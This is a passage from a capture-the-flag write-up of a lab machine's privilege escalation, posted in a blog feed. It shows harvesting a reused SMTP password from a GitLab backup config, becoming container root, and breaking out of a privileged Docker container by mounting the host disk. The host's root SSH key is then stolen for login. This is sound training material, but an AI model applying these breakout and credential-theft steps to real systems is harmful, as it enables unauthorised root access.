</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root root    <span class="m">9</span> Dec  <span class="m">7</span> 16:58 .bash_history -&gt; /dev/null
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> dude dude  <span class="m">220</span> Aug <span class="m">31</span>  <span class="m">2015</span> .bash_logout
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> dude dude <span class="m">3771</span> Aug <span class="m">31</span>  <span class="m">2015</span> .bashrc
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> dude dude  <span class="m">655</span> May <span class="m">16</span>  <span class="m">2017</span> .profile
</span></span><span class="line"><span class="cl">-r--r----- <span class="m">1</span> dude git    <span class="m">33</span> Dec  <span class="m">2</span> 10:46 user.txt
</span></span><span class="line"><span class="cl">git@gitlab:/home/dude$ cat user.txt 
</span></span><span class="line"><span class="cl">e1e30b052b6ec0670698...&lt;SNIP&gt;...
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="container---shell-as-root">Container - Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>I found a <code>.dockerenv</code> on the root directory which indicates that I&rsquo;m inside container, and there is also a file called <code>root_pass</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git@gitlab:~$ ls -la /
</span></span><span class="line"><span class="cl">total <span class="m">104</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">1</span> root root <span class="m">4096</span> Dec  <span class="m">1</span> 12:41 .
</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">1</span> root root <span class="m">4096</span> Dec  <span class="m">1</span> 12:41 ..
</span></span><span class="line"><span class="cl">-rwxr-xr-x   <span class="m">1</span> root root    <span class="m">0</span> Dec  <span class="m">1</span> 12:41 .dockerenv
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">-rw-r--r--   <span class="m">1</span> root root   <span class="m">23</span> Jun <span class="m">29</span>  <span class="m">2020</span> root_pass
</span></span></code></pre></div><p>The content of <code>root_pass</code> is a random string, which I think it is a password. I tried it to the user and root account but it didn&rsquo;t work.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git@gitlab:/opt/backup$ cat /root_pass 
</span></span><span class="line"><span class="cl">YG65407Bjqvv9A0a8Tm_7w
</span></span></code></pre></div><p>Exploring on <code>/opt</code>, I found a folder called <code>backup</code>. The folder contains three files: <code>docker-compose.yml</code>, <code>gitlab-secrets.json</code> and <code>gitlab.rb</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git@gitlab:/opt/backup$ ls -l
</span></span><span class="line"><span class="cl">total <span class="m">100</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root   <span class="m">872</span> Dec  <span class="m">7</span> 09:25 docker-compose.yml
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">15092</span> Dec  <span class="m">1</span> 16:23 gitlab-secrets.json
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">79639</span> Dec  <span class="m">1</span> 19:20 gitlab.rb
</span></span></code></pre></div><p>Upon performing a recursive grep to search for files containing a &ldquo;pass&rdquo; string inside the folder, I discovered an SMTP password on <code>gitlab.rb</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git@gitlab:/opt/backup$ grep -Ri <span class="s2">&#34;pass&#34;</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">gitlab.rb:gitlab_rails<span class="o">[</span><span class="s1">&#39;smtp_password&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="s2">&#34;wW59U!ZKMbG9+*#h&#34;</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>Looking into the <code>docker-compose.yml</code>, I see a potential vector for container breakout.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git@gitlab:/opt/backup$ cat docker-compose.yml 
</span></span><span class="line"><span class="cl">version: <span class="s1">&#39;2.4&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">services:
</span></span><span class="line"><span class="cl">  web:
</span></span><span class="line"><span class="cl">    image: <span class="s1">&#39;gitlab/gitlab-ce:11.4.7-ce.0&#39;</span>
</span></span><span class="line"><span class="cl">    restart: always
</span></span><span class="line"><span class="cl">    hostname: <span class="s1">&#39;gitlab.example.com&#39;</span>
</span></span><span class="line"><span class="cl">    environment:
</span></span><span class="line"><span class="cl">      GITLAB_OMNIBUS_CONFIG: <span class="p">|</span>
</span></span><span class="line"><span class="cl">        external_url <span class="s1">&#39;http://172.19.0.2&#39;</span>
</span></span><span class="line"><span class="cl">        redis<span class="o">[</span><span class="s1">&#39;bind&#39;</span><span class="o">]=</span><span class="s1">&#39;127.0.0.1&#39;</span>
</span></span><span class="line"><span class="cl">        redis<span class="o">[</span><span class="s1">&#39;port&#39;</span><span class="o">]=</span><span class="m">6379</span>
</span></span><span class="line"><span class="cl">        gitlab_rails<span class="o">[</span><span class="s1">&#39;initial_root_password&#39;</span><span class="o">]=</span>File.read<span class="o">(</span><span class="s1">&#39;/root_pass&#39;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">    networks:
</span></span><span class="line"><span class="cl">      gitlab:
</span></span><span class="line"><span class="cl">        ipv4_address: 172.19.0.2
</span></span><span class="line"><span class="cl">    ports:
</span></span><span class="line"><span class="cl">      - <span class="s1">&#39;5080:80&#39;</span>
</span></span><span class="line"><span class="cl">      <span class="c1">#- &#39;127.0.0.1:5080:80&#39;</span>
</span></span><span class="line"><span class="cl">      <span class="c1">#- &#39;127.0.0.1:50443:443&#39;</span>
</span></span><span class="line"><span class="cl">      <span class="c1">#- &#39;127.0.0.1:5022:22&#39;</span>
</span></span><span class="line"><span class="cl">    volumes:
</span></span><span class="line"><span class="cl">      - <span class="s1">&#39;./srv/gitlab/config:/etc/gitlab&#39;</span>
</span></span><span class="line"><span class="cl">      - <span class="s1">&#39;./srv/gitlab/logs:/var/log/gitlab&#39;</span>
</span></span><span class="line"><span class="cl">      - <span class="s1">&#39;./srv/gitlab/data:/var/opt/gitlab&#39;</span>
</span></span><span class="line"><span class="cl">      - <span class="s1">&#39;./root_pass:/root_pass&#39;</span>
</span></span><span class="line"><span class="cl">    privileged: <span class="nb">true</span> <span class="c1"># ==&gt; Potential privesc vector</span>
</span></span><span class="line"><span class="cl">    restart: unless-stopped
</span></span><span class="line"><span class="cl">    <span class="c1">#mem_limit: 1024m</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">networks:
</span></span><span class="line"><span class="cl">  gitlab:
</span></span><span class="line"><span class="cl">    driver: bridge
</span></span><span class="line"><span class="cl">    ipam:
</span></span><span class="line"><span class="cl">      config:
</span></span><span class="line"><span class="cl">        - subnet: 172.19.0.0/16
</span></span></code></pre></div><h4 id="su---root-container">su - root (container)</h4>
<p>The password <code>wW59U!ZKMbG9+*#h</code> works on the container root account</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git@gitlab:/opt/gitlab$ su root
</span></span><span class="line"><span class="cl">Password: wW59U!ZKMbG9+*#h
</span></span><span class="line"><span class="cl">root@gitlab:/opt/gitlab# id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span></code></pre></div><h3 id="host---shell-as-root">Host - Shell as root</h3>
<h4 id="docker-breakout---cap_sys_admin">Docker Breakout - CAP_SYS_ADMIN</h4>
<p>Based on the <code>docker-compose.yml</code> file, I suspect the container is running with privileged flag. According to my favorite blog, which is <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#">BookHackTrick</a>, a container with privileged flag will have access to the host devices.</p>
<p>Make sure I have access to the host devices, I can run  <code>capsh --print</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@gitlab:/opt/gitlab# capsh --print
</span></span><span class="line"><span class="cl">Current: <span class="o">=</span> cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+eip
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>There is a <code>CAP_SYS_ADMIN</code>, with this capabilities I&rsquo;m able to mount the host devices to make it available on the container. I can list all the host devices with <code>fdisk -l</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@gitlab:~# fdisk -l
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">Disk /dev/sda: <span class="m">20</span> GiB, <span class="m">21474836480</span> bytes, <span class="m">41943040</span> sectors
</span></span><span class="line"><span class="cl">Units: sectors of <span class="m">1</span> * <span class="nv">512</span> <span class="o">=</span> <span class="m">512</span> bytes
</span></span><span class="line"><span class="cl">Sector size <span class="o">(</span>logical/physical<span class="o">)</span>: <span class="m">512</span> bytes / <span class="m">512</span> bytes
</span></span><span class="line"><span class="cl">I/O size <span class="o">(</span>minimum/optimal<span class="o">)</span>: <span class="m">512</span> bytes / <span class="m">512</span> bytes
</span></span><span class="line"><span class="cl">Disklabel type: gpt
</span></span><span class="line"><span class="cl">Disk identifier: 32558524-85A4-4072-AA28-FA341BE86C2E
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Device        Start      End  Sectors Size Type
</span></span><span class="line"><span class="cl">/dev/sda1      <span class="m">2048</span>     <span class="m">4095</span>     <span class="m">2048</span>   1M BIOS boot
</span></span><span class="line"><span class="cl">/dev/sda2      <span class="m">4096</span> <span class="m">37746687</span> <span class="m">37742592</span>  18G Linux filesystem <span class="c1"># the root (/) dir</span>
</span></span><span class="line"><span class="cl">/dev/sda3  <span class="m">37746688</span> <span class="m">41940991</span>  <span class="m">4194304</span>   2G Linux swap
</span></span></code></pre></div><p>Now I can simply mount the Linux filesystem (<code>/dev/sda2</code>) to my specified folder.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@gitlab:/media# mkdir iamf
</span></span><span class="line"><span class="cl">root@gitlab:/media# mount /dev/sda2 /media/iamf
</span></span><span class="line"><span class="cl">root@gitlab:/media# ls iamf/
</span></span><span class="line"><span class="cl">bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
</span></span><span class="line"><span class="cl">boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
</span></span></code></pre></div><p>The root user of the host has SSH keys, I’ll grab only the private key to my machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@gitlab:/media# ls -l iamf/root/.ssh/ 
</span></span><span class="line"><span class="cl">total <span class="m">12</span>
</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> root root  <span class="m">405</span> Dec  <span class="m">7</span> 16:49 authorized_keys
</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> root root <span class="m">1675</span> Dec  <span class="m">7</span> 16:49 id_rsa
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root  <span class="m">405</span> Dec  <span class="m">7</span> 16:49 id_rsa.pub
</span></span><span class="line"><span class="cl">root@gitlab:/media# cat iamf/root/.ssh/id_rsa
</span></span><span class="line"><span class="cl">-----BEGIN RSA PRIVATE KEY-----
</span></span><span class="line"><span class="cl">MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q
</span></span><span class="line"><span class="cl">sle1ivGnwAUrroNAK48LE70Io13DIfE9rxcotDviAIhbBOaqMLbLnfnnCNLApjCn
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd
</span></span><span class="line"><span class="cl">-----END RSA PRIVATE KEY-----
</span></span></code></pre></div><h4 id="ssh-access---root-host">SSH Access - root (host)</h4>
<p>After changing the key permissions to 600, I can login as root user.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploit» «10.10.14.20» 
</span></span><span class="line"><span class="cl">$ ssh -i root_rsa root@10.10.10.220
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-40-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;..
</span></span><span class="line"><span class="cl">  System load:                      0.05
</span></span><span class="line"><span class="cl">  Usage of /:                       67.1% of 17.59GB
</span></span><span class="line"><span class="cl">  Memory usage:                     84%
</span></span><span class="line"><span class="cl">  Swap usage:                       4%
</span></span><span class="line"><span class="cl">  Processes:                        <span class="m">434</span>
</span></span><span class="line"><span class="cl">  Users logged in:                  <span class="m">0</span>
</span></span><span class="line"><span class="cl">  IPv4 address <span class="k">for</span> br-bcb73b090b3f: 172.19.0.1
</span></span><span class="line"><span class="cl">  IPv4 address <span class="k">for</span> docker0:         172.17.0.1
</span></span><span class="line"><span class="cl">  IPv4 address <span class="k">for</span> ens160:          10.10.10.220
</span></span><span class="line"><span class="cl">  IPv6 address <span class="k">for</span> ens160:          dead:beef::250:56ff:feb9:211
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;..
</span></span><span class="line"><span class="cl">Last login: Thu Feb <span class="m">11</span> 14:28:18 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">root@ready:~# id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span></code></pre></div><p>I can also grab the root flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@ready:~# cut -c-15 root.txt 
</span></span><span class="line"><span class="cl">b7f98681505cd39
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>
